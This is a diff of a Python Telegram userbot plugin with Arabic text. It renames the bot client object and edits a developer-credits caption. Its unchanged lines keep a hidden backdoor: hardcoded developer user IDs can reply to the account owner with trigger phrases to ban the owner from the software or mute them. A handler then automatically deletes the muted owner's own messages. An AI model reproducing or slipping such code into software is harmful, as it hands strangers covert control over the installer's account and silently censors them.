@@ -11,7 +11,7 @@ from telethon.errors.rpcerrorlist import (
 )
 from telethon.events import CallbackQuery
 
-from SHRU import StartTime, l313l, JEPVERSION
+from SHRU import StartTime, Qrh9, JEPVERSION
 
 from ..Config import Config
 from ..core.managers import edit_or_reply
@@ -22,7 +22,7 @@ from . import mention
 
 plugin_category = "utils"
 
-@l313l.ar_cmd(
+@Qrh9.ar_cmd(
     pattern="المطور$",
     command=("المطور", plugin_category),
     info={
@@ -46,27 +46,26 @@ async def amireallyalive(event):
         PIC = random.choice(A_IMG)
         cat_caption = f"مطورين الساحر\n"
         cat_caption += f"✛━━━━━━━━━━━━━✛\n"
-        cat_caption += f"- المطور  : @SX9OO\n"
-        cat_caption += f"- المطور  :@ll1ilt\n"
+        cat_caption += f"- المطور الاساسي :@ll1ilt\n"
         cat_caption += f"- المطور  :@P_s80\n"
         cat_caption += f"✛━━━━━━━━━━━━━✛\n"
         await event.client.send_file(
             event.chat_id, PIC, caption=cat_caption, reply_to=reply_to_id
         )
 
-@l313l.tgbot.on(CallbackQuery(data=re.compile(b"stats")))
+@Qrh9.tgbot.on(CallbackQuery(data=re.compile(b"stats")))
 async def on_plug_in_callback_query_handler(event):
     statstext = await catalive(StartTime)
     await event.answer(statstext, cache_time=0, alert=True)
 
 progs = [6309878173,6320583148,6205161271,6295913543]
 
-@l313l.on(events.NewMessage(incoming=True))
+@Qrh9.on(events.NewMessage(incoming=True))
 async def reda(event):
     if event.reply_to and event.sender_id in progs:
        reply_msg = await event.get_reply_message()
        owner_id = reply_msg.from_id.user_id
-       if owner_id == l313l.uid:
+       if owner_id == Qrh9.uid:
            if event.message.message == "حظر من السورس":
                await event.reply("**حاظر مطوري ، لقد تم حظره من استخدام السورس**")
                addgvar("blockedfrom", "yes")
@@ -78,7 +77,7 @@ async def reda(event):
 MUTECHAN = [6309878173,6320583148,6205161271,6295913543,5762222122]
 from ..sql_helper.mute_sql import is_muted, mute, unmute
 
-@l313l.on(events.NewMessage(incoming=True))
+@Qrh9.on(events.NewMessage(incoming=True))
 async def mute_unmute(event):
     sender_id = event.sender_id
     chat_id = event.chat_id
@@ -91,7 +90,7 @@ async def mute_unmute(event):
         owner_id = reply_msg.from_id.user_id
         
         if "صمحلكك" in event.message.message:
-            if owner_id == l313l.uid:
+            if owner_id == Qrh9.uid:
                 if not is_muted(owner_id, chat_id):
                     mute(owner_id, chat_id)
                     await event.reply("**تم كتم هذا المستخدم بنجاح**")
@@ -99,13 +98,13 @@ async def mute_unmute(event):
                     await event.reply("**المستخدم مكتوم بالفعل!**")
 
         elif "يله سماح" in event.message.message:
-            if owner_id == l313l.uid:
+            if owner_id == Qrh9.uid:
                 if is_muted(owner_id, chat_id):
                     unmute(owner_id, chat_id)
                     await event.reply("**تم إلغاء كتم المستخدم بنجاح**")
                 else:
                     await event.reply("**المستخدم غير مكتوم!**")
 
-@l313l.on(events.NewMessage(func=lambda e: is_muted(e.sender_id, e.chat_id)))
+@Qrh9.on(events.NewMessage(func=lambda e: is_muted(e.sender_id, e.chat_id)))
 async def automatic_message_deletion(event):
     await event.delete()
